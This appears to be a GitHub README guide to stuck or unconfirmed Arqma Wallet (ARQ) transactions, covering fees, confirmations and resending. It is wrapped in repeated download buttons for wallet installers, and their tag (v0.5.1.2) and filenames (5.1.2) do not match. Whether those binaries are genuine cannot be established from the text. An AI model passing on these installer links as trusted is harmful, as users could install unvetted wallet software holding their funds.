![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma Wallet transaction stuck or never confirming</h1>

<p align="center">A pending send, its fee and confirmation, and when to stop waiting.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

A stuck ARQ transaction is waiting to be included in a block, and the usual cause is the fee priority chosen when it was sent. Check the transaction on a block explorer before doing anything else  -  a send that is already confirmed needs no action, and sending again would pay twice.

## How a send becomes pending

A send is broadcast to the network, waits in the mempool, and is then included in a block. Arqma targets two-minute blocks, so a normal confirmation is minutes away; a transaction that sits far longer than that was broadcast with a low priority or is waiting on a quiet period.

Nothing is lost while a transaction is pending. The funds are committed to that transaction and cannot be spent twice, which is why a pending send never shows the amount available in two places at once.

## Check the explorer before you touch anything

The explorer is the independent record. Search the transaction and read two things: whether it is included in a block, and how many confirmations sit behind it.

- Included with confirmations: the send is done, whatever the wallet screen says. See [Arqma zero balance after restore](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-zero-balance-after-restore.md) if the balance has not caught up.
- Included with no confirmations yet: it is in the newest block; wait.
- Not found at all: the network never saw it, so a second broadcast would not duplicate the payment.

## Why the fee decides the wait

Arqma fees are set by priority: a higher priority pays a larger fee and is confirmed sooner. The wallet's default is designed for ordinary conditions, so a send made during a busy period with the lowest priority can sit in the queue while higher-fee transactions pass it.

The fee is not a tip that can be topped up afterwards. It is part of the transaction, fixed at the moment of sending.

Priority options come from the build you are running, and the current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the one these defaults describe.

## Who receives the fee

Fees go to the network  -  miners and Service Nodes  -  and never to a company, a wallet vendor or an intermediary. That is why there is no invoice, no refund and no support queue that can expedite a transaction.

If a page or a person offers to speed up a pending send for a payment, it is not part of this system. [Arqma wallet scam guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-scams-fake-support.md) covers that pattern.

## How long a confirmation should take

Ten confirmations, roughly twenty minutes at the target block time, is the practical line that wallets and merchants treat as settled. One confirmation is usually enough to see the funds arrive; ten is what makes them spendable in the eyes of a service.

A send that has one confirmation is working correctly and does not need attention, even though a cautious exchange may hold the deposit longer.

## What to do while it is pending

The transaction hash is the reference for everything that follows. Two broadcasts of the same payment are two valid transactions, and both can be included, which is how a single intended payment becomes two.

If the explorer cannot find the hash at all, the send never left your device  -  usually a lost connection at the moment of broadcast. That is the only case where sending again is the correct move.

## If it never confirms

A transaction that stays unconfirmed for hours was priced too low for the conditions at the time. The practical options are to wait for the queue to clear or, if the wallet offers it, to abandon and rebuild the transaction at a higher priority  -  but only after the explorer confirms that the original is still unconfirmed.

A transaction with any confirmations is already in a block, and sends are final. Rebuilding it would create a second, independent payment rather than replacing the first.

One case is not a pending transaction at all: a send that the wallet refused for a malformed address never entered the mempool. [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers what the wallet validates before it signs.

## When the fee looked higher than expected

A fee that looks large is usually a priority setting rather than a fault. Check the priority chosen at send time before assuming the wallet miscalculated; the amount is displayed before the send is authorised, and nothing changes it afterwards.

Fee amounts are also a function of transaction size, which grows with the number of inputs being spent. A wallet funded by many small payments pays more to move the same total than a wallet funded by one.

## When the problem is not the transaction

Two nearby problems look like a stuck send but are not. If the wallet itself is not syncing, the send may be long confirmed and invisible  -  [Arqma Wallet not syncing fix](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-not-syncing.md). If the destination is an exchange and the deposit never appears there, the transaction is fine and the credit is the issue  -  [sending ARQ to an exchange](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-send-to-exchange.md).

## What a low-priority send is waiting for

The mempool holds transactions until a block includes them, and blocks arrive on a fixed two-minute target. Space in a block is limited, so a transaction paying the least competes with everything else waiting and is included when the queue ahead of it clears.

Nothing in that process expires. A transaction does not fall out of the queue for being old, which is why a low-fee send can confirm hours later with nobody acting on it.

## Reading confirmations correctly

A confirmation is a block built on top of the one that included the transaction. One confirmation means it is in the newest block; ten means nine blocks have been built after it, which is where a service treats the payment as settled.

Counting from the send time instead of from the inclusion block is the usual misreading, and it makes an ordinary transaction look late. [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers the other reason a send never enters the queue at all.

## Keeping a record

Save the transaction hash, the amount, the destination and the time of the send. If you ever need to prove a payment  -  to a recipient, to an exchange's support team or to your own records  -  that set is the evidence, and it is far harder to reconstruct later from a wallet that has moved on.

Keep the record with the wallet backup rather than only in a chat thread. The two get used together more often than people expect, and a screenshot of the wallet is not a record while the hash is.

## FAQ

### Can I cancel a pending transaction?

Not once it is broadcast. It either confirms or waits; the wallet cannot withdraw it from the network.

### How many confirmations before ARQ is settled?

Ten, which is around twenty minutes at the two-minute target block time. One confirmation is enough to see the funds arrive.

### Why is my fee higher than the amount I expected?

Fee follows the priority you chose and the number of inputs the transaction spends. Both are set at send time and neither can be changed afterwards.

### Is it safe to resend if the explorer shows nothing?

A transaction the network never saw cannot confirm later, so a second broadcast is not a second payment.

### Do I need to keep the transaction hash?

The hash is what identifies that specific transfer on the explorer, and it is the reference a recipient or an exchange needs in order to look the payment up.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) | Why an ARQ address is 95 characters and where the prefixes come from. |
| [sending ARQ to an exchange](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-send-to-exchange.md) | Moving ARQ to a venue without payment IDs, memos or a lost deposit. |
| [Arqma zero balance after restore](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-zero-balance-after-restore.md) | A funded wallet that reads zero, and the rescan that brings it back. |
